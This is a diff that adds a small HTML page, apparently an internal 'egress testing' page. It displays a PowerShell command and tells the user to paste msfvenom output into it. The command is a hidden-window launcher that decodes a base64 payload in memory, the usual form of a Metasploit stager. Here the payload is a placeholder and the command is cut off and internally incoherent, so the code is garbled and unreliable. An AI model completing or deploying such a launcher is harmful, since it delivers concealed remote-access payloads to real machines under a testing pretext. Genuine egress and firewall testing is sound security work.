@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Lab Internal Audit</title>
+    <style>
+        body { font-family: 'Courier New', monospace; padding: 30px; background: #1e1e1e; color: #d4d4d4; }
+        .box { background: #2d2d2d; padding: 20px; border: 1px solid #444; word-break: break-all; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h2>Security Research: Egress Testing</h2>
+    <p>Use the following payload to test your firewall's outbound TCP restrictions:</p>
+    
+    <div class="box" id="payload-display">
+        </div>
+
+    <script>
+        // Paste your msfvenom output here
+        const msfPayload = "powershell.exe -nop -w hidden -c \"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('...LONG_BASE64_STRING...'));$s.Position=0;$r=New-Object IO.StreamReader($s);$d=New-Object IO.StreamReader($s);$c=New-Object IO.StreamWriter($s);$s.Close();...\"";
+        
+        document.getElementById('payload-display').innerText = msfPayload;
+    </script>
+</body>
+</html>
